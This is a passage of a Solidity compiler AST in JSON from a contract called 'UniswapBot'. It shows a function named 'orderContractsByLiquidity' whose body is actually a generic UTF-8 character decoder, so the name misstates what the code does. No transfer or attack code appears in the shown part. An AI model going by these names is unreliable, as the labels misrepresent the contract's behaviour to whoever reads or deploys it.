																		"argumentTypes": null,
																		"id": 1145,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 1143,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1082,
																			"src": "7086:6:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 1144,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7095:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "7086:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 1146,
																	"nodeType": "ExpressionStatement",
																	"src": "7086:10:9"
																}
															]
														},
														"id": 1148,
														"nodeType": "IfStatement",
														"src": "6957:151:9",
														"trueBody": {
															"id": 1136,
															"nodeType": "Block",
															"src": "6970:66:9",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 1130,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 1126,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1068,
																			"src": "6985:3:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1129,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1127,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1092,
																				"src": "6991:1:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783046",
																				"id": 1128,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6995:4:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_15_by_1",
																					"typeString": "int_const 15"
																				},
																				"value": "0x0F"
																			},
																			"src": "6991:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6985:14:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 1131,
																	"nodeType": "ExpressionStatement",
																	"src": "6985:14:9"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 1134,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 1132,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1082,
																			"src": "7014:6:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 1133,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7023:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "7014:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 1135,
																	"nodeType": "ExpressionStatement",
																	"src": "7014:10:9"
																}
															]
														}
													},
													"id": 1149,
													"nodeType": "IfStatement",
													"src": "6872:236:9",
													"trueBody": {
														"id": 1122,
														"nodeType": "Block",
														"src": "6885:66:9",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1116,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 1112,
																		"name": "ret",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1068,
																		"src": "6900:3:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1115,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1113,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1092,
																			"src": "6906:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30783146",
																			"id": 1114,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6910:4:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_31_by_1",
																				"typeString": "int_const 31"
																			},
																			"value": "0x1F"
																		},
																		"src": "6906:8:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6900:14:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1117,
																"nodeType": "ExpressionStatement",
																"src": "6900:14:9"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1120,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 1118,
																		"name": "length",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1082,
																		"src": "6929:6:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 1119,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6938:1:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "6929:10:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1121,
																"nodeType": "ExpressionStatement",
																"src": "6929:10:9"
															}
														]
													}
												},
												"id": 1150,
												"nodeType": "IfStatement",
												"src": "6793:315:9",
												"trueBody": {
													"id": 1108,
													"nodeType": "Block",
													"src": "6807:59:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1102,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1100,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1068,
																	"src": "6822:3:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 1101,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1092,
																	"src": "6828:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6822:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1103,
															"nodeType": "ExpressionStatement",
															"src": "6822:7:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1106,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1104,
																	"name": "length",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1082,
																	"src": "6844:6:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 1105,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6853:1:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6844:10:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1107,
															"nodeType": "ExpressionStatement",
															"src": "6844:10:9"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1154,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1151,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1082,
														"src": "7168:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1152,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1065,
															"src": "7177:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1153,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "7177:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7168:18:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1158,
												"nodeType": "IfStatement",
												"src": "7164:59:9",
												"trueBody": {
													"id": 1157,
													"nodeType": "Block",
													"src": "7188:35:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1155,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7210:1:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 1069,
															"id": 1156,
															"nodeType": "Return",
															"src": "7203:8:9"
														}
													]
												}
											},
											{
												"body": {
													"id": 1205,
													"nodeType": "Block",
													"src": "7270:258:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1173,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1169,
																	"name": "divisor",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1085,
																	"src": "7285:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1172,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1170,
																		"name": "divisor",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1085,
																		"src": "7295:7:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "323536",
																		"id": 1171,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7305:3:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_256_by_1",
																			"typeString": "int_const 256"
																		},
																		"value": "256"
																	},
																	"src": "7295:13:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7285:23:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1174,
															"nodeType": "ExpressionStatement",
															"src": "7285:23:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1182,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1175,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1092,
																	"src": "7323:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1181,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1178,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1176,
																					"name": "word",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1079,
																					"src": "7328:4:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1177,
																					"name": "divisor",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1085,
																					"src": "7335:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "7328:14:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 1179,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7327:16:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784646",
																		"id": 1180,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7346:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_255_by_1",
																			"typeString": "int_const 255"
																		},
																		"value": "0xFF"
																	},
																	"src": "7327:23:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7323:27:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1183,
															"nodeType": "ExpressionStatement",
															"src": "7323:27:9"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1188,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1186,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1184,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1092,
																		"src": "7369:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784330",
																		"id": 1185,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7373:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_192_by_1",
																			"typeString": "int_const 192"
																		},
																		"value": "0xC0"
																	},
																	"src": "7369:8:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 1187,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7381:4:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7369:16:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 1192,
															"nodeType": "IfStatement",
															"src": "7365:108:9",
															"trueBody": {
																"id": 1191,
																"nodeType": "Block",
																"src": "7387:86:9",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 1189,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7456:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		"functionReturnParameters": 1069,
																		"id": 1190,
																		"nodeType": "Return",
																		"src": "7449:8:9"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1203,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1193,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1068,
																	"src": "7487:3:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1202,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1196,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1194,
																					"name": "ret",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1068,
																					"src": "7494:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3634",
																					"id": 1195,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7500:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_64_by_1",
																						"typeString": "int_const 64"
																					},
																					"value": "64"
																				},
																				"src": "7494:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 1197,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7493:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "|",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1200,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1198,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1092,
																					"src": "7507:1:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "&",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30783346",
																					"id": 1199,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7511:4:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_63_by_1",
																						"typeString": "int_const 63"
																					},
																					"value": "0x3F"
																				},
																				"src": "7507:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 1201,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7506:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "7493:23:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7487:29:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1204,
															"nodeType": "ExpressionStatement",
															"src": "7487:29:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1165,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1163,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1160,
														"src": "7253:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1164,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1082,
														"src": "7257:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7253:10:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1206,
												"initializationExpression": {
													"assignments": [
														1160
													],
													"declarations": [
														{
															"constant": false,
															"id": 1160,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 1206,
															"src": "7241:6:9",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 1159,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "7241:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 1162,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1161,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7250:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "7241:10:9"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1167,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7265:3:9",
														"subExpression": {
															"argumentTypes": null,
															"id": 1166,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1160,
															"src": "7265:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1168,
													"nodeType": "ExpressionStatement",
													"src": "7265:3:9"
												},
												"nodeType": "ForStatement",
												"src": "7236:292:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1207,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1068,
													"src": "7548:3:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1069,
												"id": 1208,
												"nodeType": "Return",
												"src": "7541:10:9"
											}
										]
									},
									"documentation": null,
									"id": 1210,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "orderContractsByLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1066,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1065,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1210,
												"src": "6447:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1064,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "6447:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6446:19:9"
									},
									"returnParameters": {
										"id": 1069,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1068,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1210,
												"src": "6489:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1067,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6489:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6488:10:9"
									},
									"scope": 2159,
									"src": "6412:1147:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1297,
										"nodeType": "Block",
										"src": "7819:574:9",
										"statements": [
											{
												"assignments": [
													1218
												],
												"declarations": [
													{
														"constant": false,
														"id": 1218,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1297,
														"src": "7830:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1217,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7830:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
